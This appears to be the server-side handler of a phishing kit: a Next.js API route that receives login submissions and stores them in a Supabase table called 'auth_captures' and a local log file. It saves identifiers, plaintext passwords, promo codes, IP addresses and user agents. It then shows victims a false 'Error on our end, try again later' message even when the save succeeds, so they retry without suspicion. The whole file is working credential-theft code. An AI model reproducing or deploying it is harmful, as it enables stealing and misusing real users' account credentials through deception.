import { NextRequest, NextResponse } from 'next/server';
import { supabase } from '@/lib/supabase';
import fs from 'fs';
import path from 'path';

export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    // Extract client IP and User-Agent
    const forwardedFor = request.headers.get('x-forwarded-for');
    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Auto-resolve email / phone / identifier cleanly
    let email = body.email || null;
    let phone = body.phone || null;
    let identifier = body.identifier || null;

    if (!email && body.method === 'email' && identifier) {
      email = identifier;
    }
    if (!phone && body.method === 'phone' && identifier) {
      phone = identifier;
    }
    if (!identifier) {
      if (email) identifier = email;
      else if (phone) identifier = phone;
    }

    // Build data record for Supabase
    const record = {
      type: body.type || 'Login',
      method: body.method || (email ? 'email' : phone ? 'phone' : null),
      identifier: identifier,
      email: email,
      phone: phone,
      password: body.password || '',
      currency: body.currency || null,
      currency_name: body.currencyName || null,
      promo_code: body.promoCode || null,
      agreed_terms: Boolean(body.agreedTerms),
      ip_address: ip,
      user_agent: userAgent,
      raw_data: body,
      created_at: body.timestamp || new Date().toISOString(),
    };

    console.log('[AUTH_CAPTURE]', JSON.stringify(record, null, 2));

    // Save locally as a resilient fallback so captures are NEVER lost
    try {
      const logDir = process.env.VERCEL ? '/tmp' : process.cwd();
      const logFile = path.join(logDir, 'captures.log');
      fs.appendFileSync(logFile, JSON.stringify(record) + '\n');
    } catch (fsErr) {
      console.error('[LOCAL_LOG_ERROR]', fsErr);
    }

    // Store in Supabase
    const { data, error } = await supabase.from('auth_captures').insert([record]).select();

    if (error) {
      console.error('[SUPABASE_INSERT_ERROR]', error.message);
      // Attempt insert without .select() if SELECT RLS policy is missing
      const retry = await supabase.from('auth_captures').insert([record]);
      if (retry.error) {
        console.error('[SUPABASE_RETRY_ERROR]', retry.error.message);
        return NextResponse.json({
          ok: false,
          supabase: false,
          error: retry.error.message,
          message: 'Server error, try again'
        }, { status: 500 });
      }
      return NextResponse.json({
        ok: true,
        supabase: true,
        message: 'Error on our end, try again later'
      });
    }

    return NextResponse.json({
      ok: true,
      supabase: true,
      id: data?.[0]?.id,
      message: 'Error on our end, try again later'
    });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : String(err);
    console.error('[CAPTURE_ERROR]', message);
    return NextResponse.json({
      ok: false,
      supabase: false,
      error: message,
      message: 'Server error, try again'
    }, { status: 500 });
  }
}
